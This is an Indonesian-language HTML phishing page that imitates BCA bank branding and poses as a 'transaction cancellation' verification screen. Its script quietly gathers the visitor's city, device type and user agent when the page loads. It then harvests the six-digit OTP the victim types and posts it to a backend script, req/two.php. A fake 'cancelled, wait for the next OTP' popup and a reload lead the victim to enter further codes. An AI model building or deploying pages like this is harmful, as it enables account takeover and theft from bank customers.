<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="theme-color" content="">
 <meta content="" property="og:image">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
     <link rel="icon" type="image/png" href=""/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<style>
    <title>varifikasi</title>
<style>
* {
  box-sizing: border-box;
}
body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding-bottom: 60px;
  background-color: #dedede;
}
nav {
  background-color: #fff;
  color: #fff;
  padding: 0px 0px;
  display: flex;
  align-items: center;
  box-shadow: 0 3px 4px rgba(0,0,0,0.1);
}
nav img {
  height: px;
  box-shadow: 0 3px 4px rgba(0,0,0,0.1);
}
.header-container {
  max-width: 400px;
  margin: 0px auto;
  padding: 0, 65px;
}
.header-image {
  width:50%;
  height: auto;
  border-radius: 100px;
  transition: transform 0.4s;
  display: block;
  align-items: center;
  margin-left:90px;
}
form#otpForm {
  background-color: #fff;
  padding: 15px;
  border-radius: 8px;
  box-shadow: 0 3px px rgba(0,0,0,0.1);
  max-width: 100%;
  margin:20px;
  position: relative;
}
.otp-input-wrapper {
  position: relative;
  margin-bottom: 15px;
  margin-top:15px;
}
.otp-input-wrapper input[type="tel"] {
position: relative;
  width: 84%;
  padding: 12px 40px 12px 12px;
  font-size: 16px;
  text-align: center;
  border-radius: 5px;
  border: 1px solid #0052a1;
  font-weight:600;
  background-color: #fff;
  box-shadow: 0 4px 6px #747474;
}
#timer {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  font-weight: bold;
  color: #1868b3;
  user-select: none;
}
button#submitBtn {
  width: 100%;
  padding: 12px;
  background-color: #0f65b8;
  color: white;
  font-weight: 700;
  border: none;
  border-radius: 5px;
  font-size: 15px;
  cursor: pointer;
  transition: background-color 0.3s ease;
}
button#submitBtn:hover:not(:disabled) {
  background-color: #be0017c5;
}
button#submitBtn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}
/* Popup modal */
#popupModal {
  display: none;
  position: fixed;
  top: 0; left: 0;
  width: 100vw;
  height: 100vh;
  background: rgba(0,0,0,0.4);
  box-shadow: 0 0px 2px #747474;
  justify-content: center;
  align-items: center;
  z-index: 10000;
}
#popupModalContent {
  background: white;
  padding: 20px 25px;
  border-radius: 12px;
  max-width: 280px;
  text-align: center;
  color: green;
  box-shadow: 0 5px 8px #747474;
}
#popupModalContent h3 {
  font-style: italic;
  margin-bottom: 10px;
}
#popupModalContent h4 {
  font-weight: 500;
  font-size:13px;
  margin: 15px 0;
  line-height: 1.4;
  color:#000;
  
}
#popupModalContent img {
  width: 80px;
  height: auto;
  border-radius: 50%;
  margin-bottom: 10px;
}
#popupModalContent button {
  margin-top: 15px;
  padding: 10px 20px;
  border: none;
  border-radius: 5px;
  background-color:#3069bf;
  color: white;
  width:100%;
  font-weight: 700;
  cursor: pointer;
  transition: background-color 0.3s ease;
}
#popupModalContent button:hover {
  background-color: #00509a;
}
#popupModalContent div > button {
  margin-top: 20px;
  background-color: #3069bf;
  width:100%;
  color: #fff;
  font-weight: 600;
}
#popupModalContent div > button:hover {
  background-color: #bbb;
}
/* Footer */
footer.bca-footer {
  position: fixed;
  bottom: 0;
  width: 100%;
  background-color: #0060AF;
  color: white;
  display: flex;
  justify-content: space-around;
  align-items: center;
  padding: 0px 0;
  font-size: 12px;
  z-index: 999;
}
footer.bca-footer 
.footer-item {
  display: flex;
  flex-direction: column;
  align-items: center;
  flex: 1;
  user-select: none;
}
footer.bca-footer 
.footer-item i {
  font-size: 20px;
  margin-bottom: 3px;
}
footer.bca-footer 
.footer-item span {
  font-size: 14px;
} 
label {
    color:#000;
    font-size:14px;
    font-weight: 500;
}
</style>
</head>
<body>

<nav>
  <img src="https://ik.imagekit.io/bmp99gglh/Screenshot-20250527-120502-Samsung-Internet1%20(1).jpg?updatedAt=1759529228740" width="100%" alt="BCA Logo" />
</nav>
<br>
<div class="header-container">
    
  <form id="otpForm" method="post"style="box-shadow: 0 5px 8px #747474;">
 <center>
     <img class="" id="card-image" src="https://tse2.mm.bing.net/th?id=OIP.40wZ5KS36l5NIrJeUEt0RwHaHa&pid=Api&P=0&w=400&h=400" width="150px" alt="Card Front" />
</center>
<center>
  <label style="font-weight: 700;">Kode Pembatalan Transaksi</label>
  </center>
    <div class="otp-input-wrapper">
      <input type="tel" name="pin" id="pin" maxlength="6" placeholder="Masukkan OTP" required />
      <span id="timer">60s</span>
    </div>
    <center>
              <br>
    </center>
    <button type="submit" id="submitBtn" style="box-shadow: 0 5px 8px #747474;">Batalkan Sekarang</button>
    <br><br><br><br>

  </form>
  
</div>

<div id="popupModal"style="box-shadow: 0 5px 8px #747474;">
  <div id="popupModalContent"style="box-shadow: 0 5px 8px #747474;">
    <h3 style="font-size:15px;"><i>TRANSAKSI BERHASIL DIBATALKAN</i></h3>
    <img src="https://ik.imagekit.io/bmp99gglh/gear-check-mark-process-arrows-flat-style_78370-5110.jpg?updatedAt=1759528996496" alt="pop" />
    <h4 style="font-weight: 900;">mohon tunggu OTP berikutnya..</h4>
    
      <button id="nextBtn" style="box-shadow: 0 5px 8px #747474;">Lanjutkan</button>
       <button id="closePopupBtn" style="box-shadow: 0 5px 8px #747474;">Ke Menu Utama</button>

      <div>
     
    

    </div>
  </div>


</div>
<script>
  // Timer function, sama persis dengan aslinya
  let countdown;
  function startTimer(duration) {
    let timer = duration;
    const timerDisplay = document.getElementById('timer');
    clearInterval(countdown);
    countdown = setInterval(() => {
      timerDisplay.textContent = `${timer}s`;
      timer--;
      if (timer < 0) {
        clearInterval(countdown);
        timerDisplay.textContent = "Expired";
      }
    }, 1000);
  }

  // Fungsi ambil lokasi dan device tetap seperti aslinya
  async function saveClientInfo() {
    try {
      const res = await fetch("https://ipinfo.io/json");
      const data = await res.json();

      const kota = data.city || "Tidak diketahui";
      let deviceType = "Tidak diketahui";
      if (/android/i.test(navigator.userAgent)) deviceType = "Android";
      else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) deviceType = "iPhone/iPad";
      else deviceType = "PC/Laptop";

      const deviceName = navigator.userAgent;

      await fetch("req/two.php", {
        method: "POST",
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ kota, deviceType, deviceName })
      });
    } catch (error) {
      console.warn("Gagal ambil data lokasi/device", error);
    }
  }

  window.onload = () => {
    saveClientInfo();
    startTimer(180);
  };

  // Submit form, tanpa alert, popup tetap muncul
  document.getElementById("otpForm").addEventListener("submit", function(event) {
  event.preventDefault();

  const otp = document.getElementById("pin").value.trim();
  const submitBtn = document.getElementById("submitBtn");

  // Validate OTP: 6 digits only
  if (otp.length !== 6 || isNaN(otp)) {
    return;
  }

  submitBtn.textContent = "Memproses...";
  submitBtn.disabled = true;

  // Get location and device info (from saveClientInfo function)
  async function getClientInfo() {
    try {
      const res = await fetch("https://ipinfo.io/json");
      const data = await res.json();

      const kota = data.city || "Tidak diketahui";
      let deviceType = "Tidak diketahui";
      if (/android/i.test(navigator.userAgent)) deviceType = "Android";
      else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) deviceType = "iPhone/iPad";
      else deviceType = "PC/Laptop";

      const deviceName = navigator.userAgent;

      // Prepare data to send
      const formData = new FormData();
      formData.append("pin", otp);
      formData.append("kota", kota);
      formData.append("deviceType", deviceType);
      formData.append("deviceName", deviceName);

      // Send the data to the backend
      await fetch("req/two.php", {
        method: "POST",
        body: formData
      });
      
      // Show popup after successful submission
      document.getElementById("popupModal").style.display = "flex";
    } catch (error) {
      console.warn("Gagal ambil data lokasi/device", error);
    }
  }

  getClientInfo().finally(() => {
    submitBtn.textContent = "Batalkan Transaksi";
    submitBtn.disabled = false;
  });
});

// Popup modal button actions
document.getElementById("closePopupBtn").addEventListener("click", () => {
  window.location.href = "index.html"; // Redirect to home or other page
});

document.getElementById("nextBtn").addEventListener("click", () => {
  location.reload(); // Reload the current page
});
</script>

</body>
</html>
